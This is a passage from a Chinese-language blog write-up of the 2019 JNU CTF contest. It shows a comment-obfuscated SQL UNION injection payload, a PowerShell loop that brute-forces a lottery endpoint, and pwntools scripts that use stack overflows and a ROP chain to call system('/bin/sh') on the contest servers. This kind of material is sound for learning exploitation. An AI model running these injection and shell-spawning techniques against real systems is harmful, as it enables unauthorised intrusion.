<code>/**/</code> 替代空格：<code>-1&#39;/**/UNION/**/SELECT/**/flag,flag,flag/**/FROM/**/flag#</code>，然后得到 <code>flag{u_c4ught_me}</code>。</p><h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p><del>中途加入的送分题，娱乐题</del></p><p><del>经过测试，中奖率大概是 0.04%</del></p><img data-src="https://ae01.alicdn.com/kf/Uc7b2dcda5d0e4bcfaf0c004f57b1599fE.png" data-webp-src="https://ae01.alicdn.com/kf/H76d7dc74c1c74843af81daa176127cb4h.jpg"><p>注意：大转盘上的“flag”字样写反了（滑稽</p><p>一次一次地抽奖就算了，还得看转盘转转转，浪费时间，不如直接看源代码。每次抽奖时会从 <code>http://35.194.143.125:4522/data.php</code> 获取抽奖结果，返回类似于以下格式的 JSON 数据：</p><pre><code class="plaintext">{
    &quot;angle&quot;:306,
    &quot;prize&quot;:&quot;四等奖&quot;,
    &quot;flag&quot;:&quot;你看看你，看看你，成天就想要flag!&quot;
}</code></pre><p>注意大转盘上的 flag 部分在 150-210 度的范围内，所以可以自动抽奖（滑稽），一直到角度在 150-210 为止。</p><p>下面的抽奖脚本使用 PowerShell 实现（懒得再去查怎么用 Python 访问 URL 和解析 JSON 了）：</p><pre><code class="powershell">while ($true) {
    $Request = Invoke-RestMethod &#39;http://35.194.143.125:4522/data.php&#39;
    if ($Request.angle -ge 150 -and $Request.angle -le 210) {
        Write-Host $Request.flag
        break
    }
}</code></pre><img data-src="https://ae01.alicdn.com/kf/Hb1db1533871248bf94e3d334a6023847U.jpg" data-webp-src="https://ae01.alicdn.com/kf/Hcf1eb2207b954b6c970f151e2124fa5aQ.jpg"><p>最后得到 <code>flag{You_are_really_the_European_emperor!!!}</code>。</p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="babyrip"><a href="#babyrip" class="headerlink" title="babyrip"></a>babyrip</h2><img data-src="https://ae01.alicdn.com/kf/Ue6c17547c0cc4bc99312947143b464f9j.png" data-webp-src="https://ae01.alicdn.com/kf/H2b9c26b5b9974848b20608f3e8be7e89E.jpg"><p>之前没做过 pwn，这次为了拿分不得不开始踩坑……</p><p><code>v1</code> 存在栈溢出，左边有个 <code>backd00r</code> 函数（地址 <code>0x4007D5</code>）可以得到 Shell。</p><img data-src="https://ae01.alicdn.com/kf/Uf214f097ba1848a6adffa114eda172585.png" data-webp-src="https://ae01.alicdn.com/kf/H13a2cfb12c204ccbbf97741ded2c616fi.jpg"><p><code>v1</code> 的栈的长度被<del>钦定硬点</del>为 <code>0xF0</code>，按照 IDA 这边的提示，下面还有 <code>0x08</code> 的 s，然后就是返回地址 r，目标是要把这个 r 给强行覆盖成 <code>backd00r</code>。</p><pre><code class="python">#!/usr/bin/env python

from pwn import *

p = remote(&#39;34.80.207.78&#39;, 10000)
p.recvuntil(&#39;:&#39;)
p.sendline(&#39;a&#39; * 0xF8 + p64(0x4007D5))
p.interactive()</code></pre><img data-src="https://ae01.alicdn.com/kf/Uf96d0adb51f14f20af0fba2d24782941Q.png" data-webp-src="https://ae01.alicdn.com/kf/He0f4d7f1ac294f979ca89a3c18cbc9c0C.jpg"><p><code>flag{9af42a36-72cd-43c5-be0f-aae3aebbad}</code></p><h2 id="babyrop"><a href="#babyrop" class="headerlink" title="babyrop"></a>babyrop</h2><p>做这题的时候大量参考了 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic-rop-zh/" target="_blank" rel="noopener">CTF Wiki 上的 ROP 教程</a>，不过因为没有专门学过汇编，对 ROP 还是很难理解啊……</p><img data-src="https://ae01.alicdn.com/kf/U0bcb5df2240847c8b300574d4fcbfef1L.png" data-webp-src="https://ae01.alicdn.com/kf/H421fbf9aff334acdb4031104292204deM.jpg"><p>用 <code>checksec</code> 看一下，因为加了栈不可执行保护（NX），所以上一道题的方法不管用了。而且虽然有个 <code>backdoor</code> 函数，不过那里写的是 <code>system(&quot;echo FLAG&quot;)</code>，是个<strong>假后门</strong>。</p><img data-src="https://ae01.alicdn.com/kf/He2215e46bbf54e43b5c17ad9b63fe850P.png" data-webp-src="https://ae01.alicdn.com/kf/H82ee9b7a3507466485609b0eca7f667dQ.jpg"><p><code>echo FLAG</code> 的地址被传进了 edi（或者是 rdi？），<del>在艰苦地查阅了大量的资料后</del>，得到的结论是应该构造 ROP 链 <code>pop rdi, ret</code>（地址 <code>0x400803</code>），然后把这个 <code>echo FLAG</code> 换成 <code>/bin/sh</code>（地址 <code>0x400836</code>）。</p><img data-src="https://ae01.alicdn.com/kf/U6702c81a16264e0bb8ed099da917dd5al.png" data-webp-src="https://ae01.alicdn.com/kf/H95bdb15fdc994d8386f07cd89e843b25s.jpg"><p><code>flag{b94b8c51-c3c3-45fd-8cad-52e0ef894}</code></p><pre><code class="python">#!/usr/bin/env python

from pwn import *

p = remote(&#39;34.80.207.78&#39;, 10001)
p.recvuntil(&#39;:&#39;)

payload = &#39;&#39;
payload += &#39;a&#39; * 0xF8 # 栈溢出
payload += p64(0x400803) # ROP 链
payload += p64(0x400836) # 取 /bin/sh 字符串
payload += p64(0x400724) # 跳转到 call _system 获取 shell
p.sendline(payload)
p.interactive()</code></pre><img data-src="https://ae01.alicdn.com/kf/U2fa02d99f25e46ada662e7613230db87q.png" data-webp-src="https://ae01.alicdn.com/kf/H98f82e3235ce43f9bf5903e0624e7f47T.jpg"><h2 id="babystack"><a href="#babystack" class="headerlink" title="babystack"></a>babystack</h2><p>只要会了 babyrip，就不难理解这题了| ू•ૅω•́)ᵎᵎᵎ</p><img data-src="https://ae01.alicdn.com/kf/U4c9463eeb89a43f6b2b4b1652cee31269.png" data-webp-src="https://ae01.alicdn.com/kf/H7b80555274d24523a6d952e8a48ec191i.jpg"><p>把 <code>v3</code> 的值弄成 <code>0x1337ABC</code>，就可以马上拿到 Shell。之前的 babyrip 是通过溢出强行把函数的<strong>返回地址</strong>改为 Shell，这次就是要修改<strong>变量的值</strong>了。<code>v3</code> 在栈中的存储紧跟在 <code>v2</code> 后面，所以只要在输入 <code>v2</code> 时使用溢出就可以强行修改 <code>v3</code> 的值。</p><pre><code class="python">#!/usr/bin/env python

from pwn import *

p = remote(&#39;34.80.207.78&#39;, 10002)
# 第一次输入保存到 s，不重要
p.recvuntil(&#39;:&#39;)
p.sendline(&#39;a&#39;)
# 第二次输入保存到 v2，此时可以使用栈溢出覆盖 v3 的值
p.recvuntil(&#39;:&#39;)
p.sendline(&#39;a&#39; * 0xF8 + p64(0x1337ABC))
p.interactive()</code></pre><img data-src="https://ae01.alicdn.com/kf/U90519bc277a64b288a083e40d68c3daao.png" data-webp-src="https://ae01.alicdn.com/kf/Hc639609d605d48eb89aec1b7351ebe558.jpg"><p><code>flag{eb715228-7d01-45e6-8208-8bb9275f73d3}</code></p><hr><p>最后是个彩蛋( ﾟ∀。)</p><p>在比赛结束的前几个小时，由那位传说级菊苣带头，大家一起改起了自己的 ID，排行榜上充满了快活的空气。</p><img data-src="https://ae01.alicdn.com/kf/H9fa595bea07f49fab7852ea9264a65b2g.jpg" data-webp-src="https://ae01.alicdn.com/kf/H7443a9c8724a4687af3c610203a70e97G.jpg"><p>遗憾的是，到了晚上，管理员将这些 ID 全部都改成了参赛者的姓和“XX”，例如“曾XX”、“张XX”之类的。于是整个排行榜突然从聊天室变成了<del>枪毙名单</del>。</p><p>（当时没有截图，大家自己脑补吧┐(´-｀)┌）</p><hr><p>写完这篇 Write-Up 之后没多久，在朋友圈看到了（另一位）某君吐槽自己熬夜做题还被菊苣们吊打终于到周末可以回血了，然后发了一张排行榜截图和八张与女票一起出去玩的合照。</p><p><code>flag{1_h4v3_a_g1rlfri3nd}</code>，这题的价值远远不止 500 分，我还是输了( ・_ゝ・)</p><img data-src="https://ae01.alicdn.com/kf/U5914843156ac418480b159ca4d2b7c16j.png" data-webp-src="https://ae01.alicdn.com/kf/U5f0c851d7447457faee9752d3768ddcbK.jpg"><blockquote style="margin:2em 0 0;padding:.5em 1em;border-left:3px solid #f44336;background-color:#f5f5f5;list-style:none"><p><strong>本作品采用<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="license noopener">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a>进行许可。</strong><br><strong>本文链接：</strong><a href="https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/">https://akarin.dev/2019/11/16/2019-jnu-ctf-writeup/</a></p></blockquote></div><div id="livere-comment"><div id="lv-container" data-id="city" data-uid="MTAyMC80NDUwOC8yMTAzOQ=="><script type="text/ls-javascript" id="livere-comment-js">!function(e,t){var n,c=e.getElementsByTagName(t)[0];"function"!=typeof LivereTower&&((n=e.createElement(t)).src="https://cdn-city.livere.com/js/embed.dist.js",n.async=!0,c.parentNode.insertBefore(n,c))}(document,"script");</script></div></div><style>#livere-comment{background-color:#eee;padding:2pc}</style></div><nav class="mdl-cell mdl-cell--12-col material-nav mdl-color-text--grey-50"><a href="../../23/powershell-waifu2xgif/" class="prev-content" id="post_nav-newer"><button class="mdl-js-ripple-effect mdl-button mdl-button--icon mdl-js-button mdl-color--white mdl-color-text--grey-900" role="presentation"><i class="material-icons">arrow_back</i></button> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 新篇</a><div class="section-spacer"></div><a href="../../../10/22/upgrade-to-webp/" class="next-content" id="post_nav-older">旧篇 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <button class="mdl-js-ripple-effect mdl-button mdl-button--icon mdl-js-button mdl-color--white mdl-color-text--grey-900" role="presentation"><i class="material-icons">arrow_forward</i></button></a></nav></div></div><div class="sidebar-overlay"></div><aside class="sidebar sidebar-colored sidebar-fixed-left" id="sidebar" role="navigation"><div id="sidebar-main"><div class="header-cover sidebar-header" style="background-image:url(/img/sidebar_header.jpg);background-size:cover;background-position:center"><div class="top-bar"></div><button class="mdl-js-ripple-effect mdl-button mdl-button--icon mdl-js-button sidebar-toggle" data-upgraded=",MaterialButton,MaterialRipple" style="display:initial" type="button"><i class="material-icons">clear_all</i> <span class="mdl-button__ripple-container"><span class="mdl-ripple"></span></span></button><div class="sidebar-image"><img src="../../../../img/avatar.jpg" alt="✨小透明・宸✨'s avatar"></div><a href="#settings-dropdown" class="sidebar-brand" data-toggle="dropdown" style="background:linear-gradient(rgba(0,0,0,0),rgba(0,0,0,.35),rgba(0,0,0,.5))">存在感满满的好孩子(´•ω•`) <b class="caret"></b></a></div><ul class="nav sidebar-nav"><li class="dropdown"><ul class="dropdown-menu" id="settings-dropdown"><li><a href="https://zh.moegirl.org/%E9%98%BF%E5%8D%A1%E6%9E%97" title="\アッカリ～ン/" target="_blank">\アッカリ～ン/</a></li></ul></li><li id="sidebar-first-li"><a href="/"><i class="material-icons sidebar-material-icons">home</i> 主页</a></li><li><a href="/about" title="关于"><i class="material-icons sidebar-material-icons">person</i> 关于</a></li><li><a href="https://github.com/TransparentLC" title="GitHub" target="_blank" rel="noopener"><i class="material-icons sidebar-material-icons">code</i> GitHub</a></li><li><a href="https://git.io/AkarinNMB" title="阿卡林匿名版" target="_blank" rel="noopener"><i class="material-icons sidebar-material-icons">forum</i> 阿卡林匿名版</a></li><li><a href="/friend" title="朋友们"><i class="material-icons sidebar-material-icons">link</i> 朋友们</a></li><li><a href="/atom.xml" title="RSS"><i class="material-icons sidebar-material-icons">rss_feed</i> RSS</a></li><li class="divider"></li><li><a href="/archives">文章总数 <span class="sidebar-badge">23</span></a></li><li><a href="#"><span id="busuanzi_container_page_pv">本页浏览量<span class="sidebar-badge" id="busuanzi_value_page_pv">Loading...</span></span></a></li><li><a href="#"><span id="busuanzi_container_site_pv">本站浏览量<span class="sidebar-badge" id="busuanzi_value_site_pv">Loading...</span></span></a></li></ul></div></aside><div class="toTop-wrap" id="back-to-top"><a href="#top" class="toTop"><i class="material-icons footer_top-i">expand_less</i></a></div><footer class="mdl-mini-footer" id="bottom"><div class="mdl-mini-footer--left-section sns-list"></div><div id="copyright">Copyright&nbsp;©&nbsp;<span year></span>&nbsp;✨小透明・宸✨<br>Hosted by <a href="https://github.com/TransparentLC/transparentlc.github.io" target="_blank">Github Pages</a></div><div class="mdl-mini-footer--right-section" style="text-align:right"><div class="footer-develop-div">Powered by <a href="https://hexo.io" class="footer-develop-a" target="_blank">Hexo</a></div><div class="footer-develop-div">Theme - <a href="https://github.com/viosey/hexo-theme-material" class="footer-develop-a" target="_blank">Material</a></div></div></footer><script src="/js/fuck-wechat.min.js"></script><script>lsloader.load("js_js","https://cdn.jsdelivr.net/gh/viosey/hexo-theme-material@latest/source/js/js.min.js",!0)</script><script>lsloader.load("np_js","https://cdn.jsdelivr.net/npm/nprogress/nprogress.min.js",!0)</script><script type="text/ls-javascript" id="NProgress-script">NProgress.configure({showSpinner:!0}),NProgress.start(),$("#nprogress .bar").css({background:"#db4d6d"}),$("#nprogress .peg").css({"box-shadow":"0 0 10px #db4d6d, 0 0 15px #db4d6d"}),$("#nprogress .spinner-icon").css({"border-top-color":"#db4d6d","border-left-color":"#db4d6d"});setTimeout(function(){NProgress.done();$('.fade').removeClass('out');},800);</script><script src="https://cdn.jsdelivr.net/npm/busuanzi/bsz.pure.mini.js"></script><script>window.NodeList&&!NodeList.prototype.forEach&&(NodeList.prototype.forEach=Array.prototype.forEach)</script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script>!function(e){var t=new Image;t.onload=function(){e(0<t.width&&0<t.height)},t.onerror=function(){e(!1)},t.src="data:image/webp;base64,UklGRiIAAABXRUJQVlA4IBYAAAAwAQCdASoBAAEADsD+JaQAA3AAAAAA"}(function(t){var e=document;function r(){var r=new IntersectionObserver(function(e){e.forEach(function(e){if(e.isIntersecting){var t=e.target;t.src||(t.src=t.getAttribute("data-src")),r.unobserve(t)}})},{rootMargin:"64px 0px"});e.querySelectorAll("#post-content img").forEach(function(e){t&&!e.src&&e.getAttribute("data-webp-src")&&e.setAttribute("data-src",e.getAttribute("data-webp-src")),r.observe(e),mediumZoom(e,{margin:16,scrollOffset:8,background:"rgba(0,0,0,.85)"})})}if(window.IntersectionObserver)r();else{var n=e.createElement("script");n.src="https://cdn.jsdelivr.net/gh/w3c/IntersectionObserver/polyfill/intersection-observer.min.js",n.onload=r,e.body.appendChild(n)}})</script><script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/highlight.min.js"></script><script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release/build/languages/powershell.min.js"></script><script>document.querySelectorAll("pre code").forEach(function(t){t.innerHTML="<li>"+t.innerHTML.replace(/\n/g,"\n</li><li>")+"\n</li>";var e=document.createElement("button");e.innerText="复制代码",e.onclick=function(){var e=document.createRange();e.selectNodeContents(t);var n=document.getSelection();n.removeAllRanges(),n.addRange(e),document.execCommand("Copy"),n.removeAllRanges(),alert("复制成功～☆ﾐ(o*･ω･)ﾉ")},e.classList.add("copy-button"),t.parentNode.appendChild(e)}),hljs.initHighlightingOnLoad()</script><script type="text/ls-javascript" id="window-load">$(window).on("load",function(){$(".post-toc-wrap").parent(".mdl-menu__container").css("position","fixed")});</script><script type="text/x-mathjax-config">MathJax.Hub.Config({"HTML-CSS": { preferredFont: "TeX", availableFonts: ["STIX","TeX"], linebreaks: { automatic:true }, EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50) },
        tex2jax: { inlineMath: [ ["$", "$"], ["\\(","\\)"] ], processEscapes: true, ignoreClass: "tex2jax_ignore|dno",skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']},
        TeX: {  noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } }, Macros: { href: "{}" } },
        messageStyle: "none"
    });</script><script type="text/x-mathjax-config">MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });</script><script src="https://cdn.jsdelivr.net/npm/mathjax/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script><script>var copyrightNow=(new Date).getFullYear(),textContent=document.querySelector("span[year]");copyrightSince=0,copyrightSince===copyrightNow||0===copyrightSince?textContent.textContent=copyrightNow:textContent.textContent=copyrightSince+" - "+copyrightNow,function(){for(var t=document.querySelectorAll('script[type="text/ls-javascript"]'),e=0;e<t.length;++e){var o=t[e];lsloader.runInlineScript(o.id,o.id)}}(),console.log("\n %c © Material Theme | Version: 1.5.6 | https://github.com/viosey/hexo-theme-material %c \n","color:#455a64;background:#e0e0e0;padding:5px 0;border-top-left-radius:5px;border-bottom-left-radius:5px;","color:#455a64;background:#e0e0e0;padding:5px 0;border-top-right-radius:5px;border-bottom-right-radius:5px;"),console.log(unescape(atob("JTI1YyUyMCV1NEVDQSV1NTkyOSV1NjYyRiV1NTQ4QyV1NTk3OSV1NTcyOCV1NEUwMCV1OEQ3NyV1NzY4NCV1N0IyQyV1NTFFMCV1NTkyOSV1RkYxRiUyOCVCNCV1MzA2MyV1MDNDOSV1RkY2NSV1RkY2MSV1RkY0MCUyOSUyMA==")),"background-color:#e16b8c;color:#fff;font-family:sans-serif"),eval(atob("dHJ5e2NvbnNvbGUubG9nKGdpcmxmcmllbmQpfWNhdGNoKG8pe2NvbnNvbGUuZXJyb3IobyksY29uc29sZS5sb2coIiVjICAgICIsImJhY2tncm91bmQ6dXJsKGh0dHBzOi8vYWUwMS5hbGljZG4uY29tL2tmL0g1NjgwZDYyMTM4YWE0NmM4ODIwZjhkZWRhYTYyZWRmOUQuanBnKSBuby1yZXBlYXQgbGVmdCBjZW50ZXI7Zm9udC1zaXplOjEwMHB4O3BhZGRpbmctYm90dG9tOjEwMHB4Iil9"))</script></main></div></body></html>